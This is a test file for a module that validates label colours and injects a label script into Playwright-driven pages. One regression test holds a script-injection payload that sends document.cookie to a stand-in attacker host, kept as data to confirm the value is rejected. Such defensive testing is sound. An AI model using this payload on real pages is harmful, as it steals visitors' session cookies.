import { describe, it, expect } from 'vitest'
import { labelOptions, installLabel } from '../src/label'

describe('labelOptions', () => {
  it('returns null when there is no label to draw', () => {
    expect(labelOptions('')).toBeNull()
  })

  it('keeps a valid hex colour', () => {
    expect(labelOptions('acct@x.com', '#6366f1')).toEqual({
      labelText: 'acct@x.com',
      bgColor: '#6366f1',
    })
  })

  it('falls back to the default when the colour is not a plain hex value', () => {
    for (const bad of ['red', '#abc', '#6366f1x', 'rgb(1,2,3)', '']) {
      expect(labelOptions('x', bad)?.bgColor).toBe('#333333')
    }
  })

  // Regression: the colour was previously interpolated into generated JS source
  // with no escaping, so a crafted value ran as code in every page. MCP exposes
  // `color` to the agent, so the value is not necessarily the developer's.
  it('rejects a colour carrying a script-injection payload', () => {
    const payload = "#000000'; fetch('https://evil.example/'+document.cookie); //"
    expect(labelOptions('x', payload)?.bgColor).toBe('#333333')
  })

  it('passes the label text through untouched, including quotes and backslashes', () => {
    const nasty = `it's "quoted" \\ and 'escaped'`
    expect(labelOptions(nasty)?.labelText).toBe(nasty)
  })
})

describe('installLabel', () => {
  // Playwright serialises the function with Function.prototype.toString, so a
  // reference to any module-scope binding would be undefined inside the page.
  it('is self-contained: its source names no module-scope binding', () => {
    const src = installLabel.toString()
    expect(src).not.toMatch(/\bHEX_COLOR\b/)
    expect(src).not.toMatch(/\bDEFAULT_COLOR\b/)
    expect(src).not.toMatch(/\blabelOptions\b/)
    expect(src).not.toMatch(/\brequire\b/)
  })

  it('reads its inputs from the argument rather than from generated source', () => {
    const src = installLabel.toString()
    expect(src).toContain('opts.labelText')
    expect(src).toContain('opts.bgColor')
  })
})
